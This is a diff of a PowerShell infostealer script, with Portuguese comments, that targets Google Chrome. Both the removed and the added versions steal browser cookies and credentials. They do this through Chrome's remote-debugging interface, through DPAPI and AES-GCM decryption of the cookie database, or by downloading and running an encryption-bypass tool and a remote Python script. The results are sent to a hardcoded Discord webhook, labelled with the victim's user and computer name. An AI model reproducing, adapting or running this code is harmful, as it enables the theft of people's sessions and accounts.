@@ -2,350 +2,212 @@ param($w = "https://discord.com/api/webhooks/1503748038915522710/OaPmBZZTpD_TSm2
 
 function l { param($m) Write-Host ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $m) }
 
-# ============================================
-# MÉTODO: Chrome Debug COM BANCO REAL COPIADO
-# ============================================
-l "=== Chrome v20 Extractor ==="
+l "=== Chrome v20 Extractor (xaitax method) ==="
 l "User: $env:USERNAME@$env:COMPUTERNAME"
-
-$realUserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-l "[*] User Data: $realUserData"
 
 # Mata Chrome
 Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
 Start-Sleep -Seconds 2
 
-# Cria diretório temp para o perfil Chrome debug
-$tempProfile = "$env:TEMP\chrome_debug_" + (Get-Random -Max 99999)
-New-Item -ItemType Directory -Path $tempProfile -Force | Out-Null
+# Baixa o chromelevator.exe da release do xaitax
+$downloadUrl = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/latest/download/chromelevator_x64.exe"
+$localExe = "$env:TEMP\chromelevator.exe"
+$outputDir = "$env:TEMP\chrome_extracted_v20"
 
-# Copia TODOS os bancos de dados do perfil Default (e Profile 1, 2...)
-$profilesToCopy = @('Default','Profile 1','Profile 2','Profile 3','Profile 4')
-$copiedProfiles = @()
-
-foreach ($prof in $profilesToCopy) {
-    $srcDir = Join-Path $realUserData $prof
-    $dstDir = Join-Path $tempProfile $prof
-    
-    if (Test-Path $srcDir) {
-        New-Item -ItemType Directory -Path $dstDir -Force | Out-Null
-        
-        # Copia só os bancos de dados + arquivos essenciais
-        foreach ($file in @('Cookies','Cookies-journal','Login Data','Login Data-journal','Web Data','Web Data-journal','Bookmarks','Preferences')) {
-            $srcFile = Join-Path $srcDir $file
-            $dstFile = Join-Path $dstDir $file
-            if (Test-Path $srcFile) {
-                Copy-Item $srcFile $dstFile -Force -ErrorAction SilentlyContinue
-            }
-        }
-        $copiedProfiles += $prof
-        l "[COPY] Perfil $prof copiado"
-    }
-}
-
-# Copia também o Local State (necessário para o Chrome)
-$srcLocalState = Join-Path $realUserData 'Local State'
-$dstLocalState = Join-Path $tempProfile 'Local State'
-if (Test-Path $srcLocalState) {
-    Copy-Item $srcLocalState $dstLocalState -Force
-    l "[COPY] Local State copiado"
-}
-
-l "[*] Perfis copiados: $($copiedProfiles -join ', ')"
-l "[*] Iniciando Chrome com debug no perfil copiado..."
-
-$chromeExe = "$env:ProgramFiles\Google\Chrome\Application\chrome.exe"
-if (!(Test-Path $chromeExe)) { $chromeExe = "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe" }
-if (!(Test-Path $chromeExe)) { $chromeExe = "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe" }
-
-$port = 9222
-
+l "[*] Baixando chromelevator.exe..."
 try {
-    $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName = $chromeExe
-    $psi.Arguments = "--remote-debugging-port=$port --remote-allow-origins=* --headless --user-data-dir=$tempProfile --no-first-run --disable-features=ChromeWhatsNewUI --disable-sync --no-default-browser-check --disable-translate"
-    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $psi.CreateNoWindow = $true
-    $psi.UseShellExecute = $false
-    $proc = [System.Diagnostics.Process]::Start($psi)
-    
-    Start-Sleep -Seconds 4
-    
-    # Conecta no WebSocket
-    $wsUrl = $null
-    for ($attempt = 0; $attempt -lt 10; $attempt++) {
-        try {
-            $resp = Invoke-RestMethod "http://127.0.0.1:$port/json/version" -TimeoutSec 3
-            $wsUrl = $resp.webSocketDebuggerUrl
-            if ($wsUrl) { break }
-        } catch {}
-        Start-Sleep -Seconds 1
-    }
-    
-    if (!$wsUrl) {
-        try {
-            $list = Invoke-RestMethod "http://127.0.0.1:$port/json" -TimeoutSec 3
-            if ($list -and $list.Count -gt 0 -and $list[0].webSocketDebuggerUrl) {
-                $wsUrl = $list[0].webSocketDebuggerUrl
-            }
-        } catch {}
-    }
-    
-    if (!$wsUrl) {
-        l "[ERRO] Nao foi possivel conectar ao Chrome Debug"
-        throw "No WebSocket URL"
-    }
-    
-    l "[WS] Conectado: $($wsUrl.Substring(0, 50))..."
-    
-    $ws = New-Object System.Net.WebSockets.ClientWebSocket
-    $ws.Options.KeepAliveInterval = [TimeSpan]::FromSeconds(30)
-    $ws.ConnectAsync([System.Uri]$wsUrl, [System.Threading.CancellationToken]::None).Wait()
-    
-    # Network.getAllCookies
-    $msg = '{"id":1,"method":"Network.getAllCookies"}'
-    $ws.SendAsync([System.ArraySegment[byte]]::new([System.Text.Encoding]::UTF8.GetBytes($msg)), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
-    
-    $buf = [byte[]]::new(524288)
-    $res = $ws.ReceiveAsync([System.ArraySegment[byte]]::new($buf), [System.Threading.CancellationToken]::None).Result
-    $respStr = [System.Text.Encoding]::UTF8.GetString($buf, 0, $res.Count)
-    
-    $ws.Dispose()
-    
-    $json = $respStr | ConvertFrom-Json
-    $allCookies = @()
-    if ($json.result -and $json.result.cookies) {
-        $allCookies = $json.result.cookies
-    }
-    
-    l "[OK] Network.getAllCookies retornou $($allCookies.Count) cookies"
-    
-    if ($allCookies.Count -gt 0) {
-        $cc = $allCookies | ConvertTo-Json -Depth 3
-        
-        # Envia Discord
-        $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
-        $body = @()
-        $body += "--$boundary"
-        $body += 'Content-Disposition: form-data; name="payload_json"'
-        $body += ""
-        $body += ('{"content":"Chrome v20 BYPASS | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Cookies: ' + $allCookies.Count + ' | Metodo: Chrome Debug"}')
-        $body += "--$boundary"
-        $body += 'Content-Disposition: form-data; name="file"; filename="cookies.json"'
-        $body += "Content-Type: application/json"
-        $body += ""
-        $body += $cc
-        $body += "--$boundary--"
-        
-        $bodyStr = $body -join "`r`n"
-        $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($downloadUrl, $localExe)
+    $wc.Dispose()
+    l "[OK] Download concluido: $localExe"
+} catch {
+    l "[ERRO] Download falhou: $_"
+    l "[*] Tentando URL alternativa..."
+    try {
+        $downloadUrl = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.17.2/chromelevator_x64.exe"
         $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
-        $wc.UploadData($w, "POST", $bytes) | Out-Null
+        $wc.DownloadFile($downloadUrl, $localExe)
         $wc.Dispose()
-        l "[DISCORD] Cookies enviados!"
+        l "[OK] Download concluido (v0.17.2)"
+    } catch {
+        l "[ERRO] Download alternativo falhou: $_"
         
-        $out = "$env:TEMP\chrome_extracted"
-        if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
-        $cc | Out-File (Join-Path $out "cookies.json") -Encoding UTF8
-        l "[SALVO] $out\cookies.json"
-        l "=== CONCLUIDO ==="
-        
-        # Cleanup
-        if ($proc -and !$proc.HasExited) { $proc.Kill() }
-        Start-Sleep -Seconds 1
-        if (Test-Path $tempProfile) { Remove-Item $tempProfile -Recurse -Force -ErrorAction SilentlyContinue }
-        return
-    }
-    
-    # Se não veio cookies via getAllCookies, tenta via Storage
-    l "[*] Nenhum cookie via getAllCookies. Tentando Storage.getCookies..."
-    
-    # Tenta abrir uma pagina para forçar o Chrome a carregar os cookies
-    $ws2 = New-Object System.Net.WebSockets.ClientWebSocket
-    $ws2.ConnectAsync([System.Uri]$wsUrl, [System.Threading.CancellationToken]::None).Wait()
-    
-    # Cria um target (aba) primeiro
-    $newTargetMsg = '{"id":2,"method":"Target.createTarget","params":{"url":"about:blank"}}'
-    $ws2.SendAsync([System.ArraySegment[byte]]::new([System.Text.Encoding]::UTF8.GetBytes($newTargetMsg)), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
-    
-    $buf2 = [byte[]]::new(524288)
-    $res2 = $ws2.ReceiveAsync([System.ArraySegment[byte]]::new($buf2), [System.Threading.CancellationToken]::None).Result
-    $targetResp = [System.Text.Encoding]::UTF8.GetString($buf2, 0, $res2.Count)
-    $ws2.Dispose()
-    
-    # Pega o targetId e conecta nele
-    $targetJson = $targetResp | ConvertFrom-Json
-    if ($targetJson.result -and $targetJson.result.targetId) {
-        $targetId = $targetJson.result.targetId
-        l "[TARGET] Target ID: $targetId"
-        
-        # Conecta no target específico
-        $targetWsUrl = "ws://127.0.0.1:$port/devtools/page/$targetId"
-        
-        $ws3 = New-Object System.Net.WebSockets.ClientWebSocket
-        $ws3.ConnectAsync([System.Uri]$targetWsUrl, [System.Threading.CancellationToken]::None).Wait()
-        
-        # Habilita Network
-        $enableMsg = '{"id":1,"method":"Network.enable"}'
-        $ws3.SendAsync([System.ArraySegment[byte]]::new([System.Text.Encoding]::UTF8.GetBytes($enableMsg)), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
-        Start-Sleep -Milliseconds 500
-        
-        # Pega cookies da página
-        $cookiesMsg = '{"id":2,"method":"Network.getCookies"}'
-        $ws3.SendAsync([System.ArraySegment[byte]]::new([System.Text.Encoding]::UTF8.GetBytes($cookiesMsg)), [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
-        
-        $buf3 = [byte[]]::new(524288)
-        $res3 = $ws3.ReceiveAsync([System.ArraySegment[byte]]::new($buf3), [System.Threading.CancellationToken]::None).Result
-        $cookiesResp = [System.Text.Encoding]::UTF8.GetString($buf3, 0, $res3.Count)
-        $ws3.Dispose()
-        
-        $cookiesJson = $cookiesResp | ConvertFrom-Json
-        if ($cookiesJson.result -and $cookiesJson.result.cookies) {
-            $allCookies = $cookiesJson.result.cookies
-            l "[OK] Network.getCookies retornou $($allCookies.Count) cookies"
+        # Última tentativa: baixar o zip e extrair
+        try {
+            $zipUrl = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/latest/download/chromelevator_x64.zip"
+            $zipPath = "$env:TEMP\chromelevator.zip"
+            $wc = New-Object System.Net.WebClient
+            $wc.DownloadFile($zipUrl, $zipPath)
+            $wc.Dispose()
+            
+            Add-Type -AssemblyName System.IO.Compression.FileSystem
+            $zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
+            $entry = $zip.Entries | Where-Object { $_.Name -like "*.exe" } | Select-Object -First 1
+            if ($entry) {
+                [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $localExe, $true)
+                l "[OK] Extraido do zip"
+            }
+            $zip.Dispose()
+            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+        } catch {
+            l "[ERRO] Todas as tentativas de download falharam"
+            l "[*] Tentando metodo alternativo..."
+            $localExe = $null
         }
     }
+}
+
+if ($localExe -and (Test-Path $localExe)) {
+    # Prepara diretório de saída
+    if (Test-Path $outputDir) { Remove-Item $outputDir -Recurse -Force -ErrorAction SilentlyContinue }
+    New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
     
-    if ($allCookies.Count -gt 0) {
-        $cc = $allCookies | ConvertTo-Json -Depth 3
+    # O chromelevator.exe precisa estar no diretório do Chrome para funcionar
+    $chromeDir = "$env:ProgramFiles\Google\Chrome\Application"
+    if (!(Test-Path $chromeDir)) { $chromeDir = "${env:ProgramFiles(x86)}\Google\Chrome\Application" }
+    
+    l "[*] Copiando chromelevator.exe para $chromeDir..."
+    Copy-Item $localExe (Join-Path $chromeDir "chromelevator.exe") -Force -ErrorAction SilentlyContinue
+    
+    # Executa de dentro do diretório do Chrome
+    l "[*] Executando chromelevator.exe..."
+    Push-Location $chromeDir
+    
+    try {
+        $proc = Start-Process -FilePath ".\chromelevator.exe" -ArgumentList "chrome","--output-dir","$outputDir" -NoNewWindow -Wait -PassThru -RedirectStandardOutput "$env:TEMP\chromelevator_out.txt" -RedirectStandardError "$env:TEMP\chromelevator_err.txt"
         
-        $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
-        $body = @()
-        $body += "--$boundary"
-        $body += 'Content-Disposition: form-data; name="payload_json"'
-        $body += ""
-        $body += ('{"content":"Chrome v20 BYPASS | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Cookies: ' + $allCookies.Count + ' | Metodo: Chrome Debug"}')
-        $body += "--$boundary"
-        $body += 'Content-Disposition: form-data; name="file"; filename="cookies.json"'
-        $body += "Content-Type: application/json"
-        $body += ""
-        $body += $cc
-        $body += "--$boundary--"
+        l "[*] chromelevator.exe exit code: $($proc.ExitCode)"
         
-        $bodyStr = $body -join "`r`n"
-        $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
-        $wc.UploadData($w, "POST", $bytes) | Out-Null
-        $wc.Dispose()
-        l "[DISCORD] Cookies enviados!"
+        $stdout = Get-Content "$env:TEMP\chromelevator_out.txt" -Raw -ErrorAction SilentlyContinue
+        $stderr = Get-Content "$env:TEMP\chromelevator_err.txt" -Raw -ErrorAction SilentlyContinue
         
-        $out = "$env:TEMP\chrome_extracted"
-        if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
-        $cc | Out-File (Join-Path $out "cookies.json") -Encoding UTF8
-        l "[SALVO] $out\cookies.json"
-    } else {
-        l "[FALHA] Chrome Debug retornou 0 cookies mesmo com banco copiado"
-        l "[*] Tentando decrypt via DB como fallback..."
+        if ($stdout) { l "[STDOUT] $stdout" }
+        if ($stderr) { l "[STDERR] $stderr" }
         
-        # === FALLBACK: tentar decrypt via DB ===
-        $json = Get-Content (Join-Path $realUserData "Local State") -Raw | ConvertFrom-Json
-        $ek = $json.os_crypt.encrypted_key
-        $ak = $json.os_crypt.app_bound_encrypted_key
+        # Verifica arquivos de saída
+        $resultFiles = Get-ChildItem $outputDir -Recurse -File -ErrorAction SilentlyContinue
+        l "[*] Arquivos gerados: $($resultFiles.Count)"
         
-        # Tenta DPAPI normal
-        if ($ek) {
-            $raw = [Convert]::FromBase64String($ek)
-            if ($raw[0] -eq 1 -and $raw.Length -gt 5) {
-                try {
-                    $d = $raw[5..($raw.Length-1)]
-                    $mk = [System.Security.Cryptography.ProtectedData]::Unprotect($d, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                    if ($mk.Length -ge 32) {
-                        $mk = $mk[0..31]
-                        l "[FALLBACK] DPAPI v10 funcionou!"
+        if ($resultFiles.Count -gt 0) {
+            # Envia cada arquivo como anexo no Discord
+            $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
+            $body = @()
+            $body += "--$boundary"
+            $body += 'Content-Disposition: form-data; name="payload_json"'
+            $body += ""
+            $body += ('{"content":"Chrome v20 BYPASS | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Arquivos: ' + $resultFiles.Count + ' | Metodo: xaitax chromelevator"}')
+            
+            foreach ($file in $resultFiles) {
+                $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
+                if ($content -and $content.Length -gt 0) {
+                    $body += "--$boundary"
+                    $body += ('Content-Disposition: form-data; name="file"; filename="' + $file.Name + '"')
+                    $body += "Content-Type: application/json"
+                    $body += ""
+                    $body += $content
+                }
+            }
+            
+            $body += "--$boundary--"
+            
+            $bodyStr = $body -join "`r`n"
+            $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
+            try {
+                $wc = New-Object System.Net.WebClient
+                $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
+                $wc.UploadData($w, "POST", $bytes) | Out-Null
+                $wc.Dispose()
+                l "[DISCORD] Dados enviados com sucesso!"
+            } catch { l "[FALHA] Discord: $_" }
+            
+            # Salva local também
+            $out = "$env:TEMP\chrome_extracted"
+            if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
+            foreach ($file in $resultFiles) {
+                Copy-Item $file.FullName (Join-Path $out $file.Name) -Force -ErrorAction SilentlyContinue
+            }
+            l "[SALVO] $out"
+        } else {
+            l "[FALHA] Nenhum arquivo gerado pelo chromelevator"
+            l "[*] Tentando executar sem argumentos..."
+            
+            # Tenta sem argumentos
+            $proc2 = Start-Process -FilePath ".\chromelevator.exe" -NoNewWindow -Wait -PassThru -RedirectStandardOutput "$env:TEMP\chromelevator_out2.txt" -RedirectStandardError "$env:TEMP\chromelevator_err2.txt"
+            
+            $stdout2 = Get-Content "$env:TEMP\chromelevator_out2.txt" -Raw -ErrorAction SilentlyContinue
+            $stderr2 = Get-Content "$env:TEMP\chromelevator_err2.txt" -Raw -ErrorAction SilentlyContinue
+            if ($stdout2) { l "[STDOUT2] $stdout2" }
+            if ($stderr2) { l "[STDERR2] $stderr2" }
+            
+            # Verifica se criou arquivos no diretório atual
+            $localFiles = Get-ChildItem $chromeDir -Filter "*.json" -ErrorAction SilentlyContinue
+            if ($localFiles.Count -gt 0) {
+                l "[*] Arquivos JSON encontrados no diretorio do Chrome: $($localFiles.Count)"
+                foreach ($file in $localFiles) {
+                    $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
+                    if ($content -and $content.Length -gt 0) {
+                        $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
+                        $body = @()
+                        $body += "--$boundary"
+                        $body += 'Content-Disposition: form-data; name="payload_json"'
+                        $body += ""
+                        $body += ('{"content":"Chrome v20 BYPASS | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Arquivo: ' + $file.Name + ' | Metodo: xaitax chromelevator"}')
+                        $body += "--$boundary"
+                        $body += ('Content-Disposition: form-data; name="file"; filename="' + $file.Name + '"')
+                        $body += "Content-Type: application/json"
+                        $body += ""
+                        $body += $content
+                        $body += "--$boundary--"
                         
-                        # Descriptografa cookies do banco copiado
-                        Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction SilentlyContinue
-                        $allDecCookies = @()
+                        $bodyStr = $body -join "`r`n"
+                        $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
+                        $wc = New-Object System.Net.WebClient
+                        $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
+                        $wc.UploadData($w, "POST", $bytes) | Out-Null
+                        $wc.Dispose()
+                        l "[DISCORD] $($file.Name) enviado!"
                         
-                        foreach ($prof in $copiedProfiles) {
-                            $cookiesDb = Join-Path $tempProfile "$prof\Cookies"
-                            if (Test-Path $cookiesDb) {
-                                try {
-                                    $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$cookiesDb")
-                                    $conn.Open()
-                                    $cmd = $conn.CreateCommand()
-                                    $cmd.CommandText = "SELECT host_key, name, path, encrypted_value FROM cookies"
-                                    $reader = $cmd.ExecuteReader()
-                                    while ($reader.Read()) {
-                                        $eb = $reader["encrypted_value"]
-                                        if ($eb -is [string]) { continue }
-                                        $ebArr = [byte[]]$eb
-                                        if ($ebArr.Length -ge 15) {
-                                            try {
-                                                if ($ebArr[0] -eq 2 -or $ebArr[0] -eq 3) {
-                                                    $n=$ebArr[3..14]; $cl=$ebArr.Length-15-16
-                                                    if ($cl -gt 0) {
-                                                        $c=$ebArr[15..(15+$cl-1)]; $t=$ebArr[(15+$cl)..($ebArr.Length-1)]
-                                                        $a=[System.Security.Cryptography.AesGcm]::new($mk,16)
-                                                        $r=[byte[]]::new($cl)
-                                                        $a.Decrypt($n,$c,$t,$r)
-                                                        $a.Dispose()
-                                                        $val = [System.Text.Encoding]::UTF8.GetString($r)
-                                                        $allDecCookies += @{host=$reader["host_key"];name=$reader["name"];value=$val;path=$reader["path"]}
-                                                    }
-                                                } elseif ($ebArr[0] -eq 1) {
-                                                    $c=$ebArr[3..($ebArr.Length-1)]
-                                                    $d=[System.Security.Cryptography.ProtectedData]::Unprotect($c,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-                                                    $val=[System.Text.Encoding]::UTF8.GetString($d)
-                                                    $allDecCookies += @{host=$reader["host_key"];name=$reader["name"];value=$val;path=$reader["path"]}
-                                                }
-                                            } catch {}
-                                        }
-                                    }
-                                    $reader.Close(); $conn.Close()
-                                } catch { l "[DB] Erro: $_" }
-                            }
-                        }
-                        
-                        if ($allDecCookies.Count -gt 0) {
-                            l "[FALLBACK] $($allDecCookies.Count) cookies descriptografados via DB!"
-                            $cc = $allDecCookies | ConvertTo-Json -Depth 3
-                            
-                            $boundary = "----Boundary" + [System.Guid]::NewGuid().ToString().Replace("-","")
-                            $body = @()
-                            $body += "--$boundary"
-                            $body += 'Content-Disposition: form-data; name="payload_json"'
-                            $body += ""
-                            $body += ('{"content":"Chrome v20 FALLBACK | ' + $env:USERNAME + '@' + $env:COMPUTERNAME + ' | Cookies: ' + $allDecCookies.Count + ' | Metodo: DPAPI decrypt"}')
-                            $body += "--$boundary"
-                            $body += 'Content-Disposition: form-data; name="file"; filename="cookies.json"'
-                            $body += "Content-Type: application/json"
-                            $body += ""
-                            $body += $cc
-                            $body += "--$boundary--"
-                            
-                            $bodyStr = $body -join "`r`n"
-                            $bytes = [System.Text.Encoding]::UTF8.GetBytes($bodyStr)
-                            $wc = New-Object System.Net.WebClient
-                            $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
-                            $wc.UploadData($w, "POST", $bytes) | Out-Null
-                            $wc.Dispose()
-                            l "[DISCORD] Cookies enviados via fallback DB!"
-                            
-                            $out = "$env:TEMP\chrome_extracted"
-                            if (!(Test-Path $out)) { New-Item -ItemType Directory -Path $out -Force | Out-Null }
-                            $cc | Out-File (Join-Path $out "cookies.json") -Encoding UTF8
-                            l "[SALVO] $out\cookies.json"
-                        } else {
-                            l "[FALHA] Nenhum cookie descriptografado via DB"
-                        }
+                        Copy-Item $file.FullName (Join-Path $out $file.Name) -Force -ErrorAction SilentlyContinue
                     }
-                } catch { l "[FALLBACK] DPAPI falhou: $_" }
+                }
             }
         }
+    } catch {
+        l "[ERRO] Execucao falhou: $_"
     }
+    
+    Pop-Location
     
     # Cleanup
-    if ($proc -and !$proc.HasExited) { $proc.Kill() }
-    Start-Sleep -Seconds 1
-    if (Test-Path $tempProfile) { Remove-Item $tempProfile -Recurse -Force -ErrorAction SilentlyContinue }
+    Remove-Item $localExe -Force -ErrorAction SilentlyContinue
+    Remove-Item (Join-Path $chromeDir "chromelevator.exe") -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\chromelevator_out.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\chromelevator_err.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\chromelevator_out2.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\chromelevator_err2.txt" -Force -ErrorAction SilentlyContinue
+} else {
+    l "[FALHA] chromelevator.exe nao disponivel"
+    l "[*] Tentando metodo Python como ultimo recurso..."
     
-} catch {
-    l "[ERRO] $($_.Exception.Message)"
-    if ($proc -and !$proc.HasExited) { $proc.Kill() }
-    if (Test-Path $tempProfile) { Remove-Item $tempProfile -Recurse -Force -ErrorAction SilentlyContinue }
+    # Verifica se tem Python
+    $python = Get-Command python -ErrorAction SilentlyContinue
+    if ($python) {
+        l "[*] Python encontrado. Baixando script de decrypt..."
+        try {
+            $scriptUrl = "https://raw.githubusercontent.com/runassu/chrome_v20_decryption/main/decrypt.py"
+            $scriptPath = "$env:TEMP\decrypt_v20.py"
+            $wc = New-Object System.Net.WebClient
+            $wc.DownloadFile($scriptUrl, $scriptPath)
+            $wc.Dispose()
+            
+            # Executa o script Python
+            l "[*] Executando decrypt.py..."
+            $output = & python $scriptPath 2>&1
+            l "[PYTHON] $output"
+        } catch { l "[ERRO] Python fallback falhou: $_" }
+    } else {
+        l "[FALHA] Python nao encontrado"
+    }
 }
 
 l "=== CONCLUIDO ==="
